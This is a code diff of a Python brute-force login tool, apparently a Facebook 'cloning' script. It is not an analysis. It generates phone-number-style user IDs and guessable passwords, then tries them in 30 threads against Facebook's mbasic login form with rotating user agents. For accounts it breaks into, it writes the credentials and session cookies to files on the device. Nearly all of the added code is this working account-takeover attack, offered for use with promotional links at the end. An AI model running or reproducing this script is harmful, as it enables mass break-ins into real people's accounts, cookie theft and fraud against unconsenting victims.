+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    code = input('\033[1;33m[💔\033[1;32m]\033[1;33m YOUR SIM CODE : ')
+    name = ''.join(random.choice(string.digits) for _ in range(2))
+    cod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    print(logo)
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print('\033[1;32m[🌺\033[1;32m]\033[1;36m Example : \033[1;32m[\033[1;33m3000\033[1;32m]\033[1;35m [\033[1;32m5000\033[1;35m] \033[1;33m[\033[1;34m10000\033[1;33m] ')
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    limit = int(input('\033[1;33m[💔\033[1;32m]\033[1;33m YOUR LIMITED : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as asha:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print('\033[1;33m[🌺\033[1;33m] \033[1;36mYOUR TOTAL IDS : \033[1;32m'+tl)
+        print("\033[1;33m[🌺\033[1;33m] \033[1;36mYOUR SIM CODE  :\033[1;32m "+code)
+        print('\033[1;33m[🌺\033[1;33m]\033[1;36m PLEASE WAIT CLONING START')
+        print('\033[1;33m[🌺\033[1;33m] \033[1;36mSUPER FAST SPEED CLONING')
+        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        for love in user:
+            uid = code+name+cod+love
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
+            asha.submit(jubair,uid,pwx,tl)
+    print(f"{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print(' [🌺] Your list complete')
+    print(' [🌺] Thanks for use my tool')
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+def jubair(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
     try:
-        filename = input(f" [{B}>>{W}] ENTER FILE NAME: ")
-        sd = '/sdcard/'
-        file_path = os.path.join(sd, filename)
-        with open(file_path, 'r') as file:
-            lines = file.read().splitlines()
-        lines = sorted(set(lines))
-        with open(file_path, 'w') as file:
-            for line in lines:
-                file.write(line + '\n')
-        linex()
-        print(f' [{B}√{W}] SUCCESSFULLY REMOVED')
-        input(f' [{B}√{W}] PRESS ENTER TO BACK ')
-        back()
-    except FileNotFoundError:
-        linex()
-        print(f' [{B}×{W}] FILE NOT FOUND TRY AGAIN ')
-        time.sleep(2)
-        remove_dub()
- 
-main_menu()
-os.system('rm -rf .a.txt')
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r\033[1;32m[SABBIR-BHAI]\033[1;36m💔[%s/%s]🌺\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+    'method': 'GET',
+    'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+    'cache-control': 'max-age=0',
+    'dpr': '1.7000000476837158',
+    'referer': 'https://mbasic.facebook.com/login/',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"RMX3461"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"12.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro,
+    'viewport-width': '980',}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"\033[1;33m[\033[1;32mSABBIR-OK 🌺\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
+                print(f"\033[1;92m[] COOKIE🌹 :\033[1;95m {coki}")
+                open('/sdcard/SABBIR-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                print(f"\033[1;33m[\033[1;32mSABBIR-CP\033[1;33m]\033[1;91m {uid}|{ps}")
+                open('/sdcard/SABBIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+        
+Main()
+# END #
+
+
+#follow my facebook page https://www.facebook.com/profile.php?id=100089747571096&mibextid=ZbWKwL
+#follow github https://github.com/Rdx337
+#join our fb grup https://www.facebook.com/groups/136091586257336/?ref=share_group_link
